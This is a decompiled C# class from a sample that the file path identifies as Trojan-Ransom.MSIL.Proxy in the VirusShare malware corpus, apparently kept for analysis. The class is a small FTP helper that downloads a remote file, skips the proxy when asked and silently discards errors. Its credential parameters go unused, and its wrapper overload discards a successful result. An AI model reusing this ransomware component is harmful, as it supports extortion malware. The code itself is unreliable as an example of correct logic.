// Decompiled with JetBrains decompiler
// Type: ProxyService.FtpHelper
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C65BAEF2-27B1-483E-BCFA-C7E1657D8675
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.MSIL.Proxy.a-068745a53b540e808258feae637b3194bb38c985.exe

using System;
using System.IO;
using System.Net;

namespace ProxyService
{
  public class FtpHelper
  {
    public static string GetXml(string uri, string user, string pass, bool noproxy)
    {
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(uri);
        ftpWebRequest.Method = "RETR";
        if (noproxy)
          ftpWebRequest.Proxy = (IWebProxy) null;
        FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(response.GetResponseStream());
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        response.Close();
        return end;
      }
      catch (Exception ex)
      {
      }
      return "";
    }

    public static string GetXml(string uri, string user, string pass) => FtpHelper.GetXml(uri, user, pass, false) == "" ? FtpHelper.GetXml(uri, user, pass, true) : "";
  }
}
